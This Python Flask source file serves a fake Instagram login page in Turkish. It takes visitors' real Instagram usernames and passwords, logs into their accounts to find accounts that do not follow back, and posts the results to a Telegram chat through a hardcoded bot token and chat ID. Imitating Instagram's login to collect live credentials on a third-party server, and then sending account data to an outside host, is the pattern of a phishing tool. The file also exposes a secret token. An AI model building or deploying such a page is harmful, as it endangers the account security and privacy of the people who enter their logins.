
from flask import Flask, request, render_template_string, jsonify
from instagrapi import Client
import requests

app = Flask(__name__)

LOGIN_FORM = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Instagram Giriş</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { background: white; padding: 40px; border: 1px solid #dbdbdb; border-radius: 8px; text-align: center; }
        input { display: block; margin: 10px auto; padding: 10px; width: 90%; border: 1px solid #ccc; border-radius: 4px; }
        button { padding: 10px 20px; background: #3897f0; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #287dcf; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Instagram</h2>
        <form action="/login" method="post">
            <input type="text" name="username" placeholder="Kullanıcı Adı" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(LOGIN_FORM)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    cl = Client()
    try:
        cl.login(username, password)
        followers = cl.user_followers(cl.user_id)
        followings = cl.user_following(cl.user_id)

        not_following_back = [followings[uid].username for uid in followings if uid not in followers]
        first_10 = not_following_back[:10]

        # Telegram'a mesaj gönder
        if first_10:
            message = "Seni takip etmeyen ilk 10 kişi:\n" + "\n".join(["- @" + u for u in first_10])
        else:
            message = "Herkes seni geri takip ediyor!"

        requests.post(
            f"https://api.telegram.org/bot7826510525:AAETKgNWahBzWWa4FRRkCnit4QaByYFjHYc/sendMessage",
            data={"chat_id": "6642524834", "text": message}
        )

        return jsonify({"status": "success", "not_following_back": first_10})
    except Exception as e:
        return jsonify({"status": "fail", "message": str(e)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
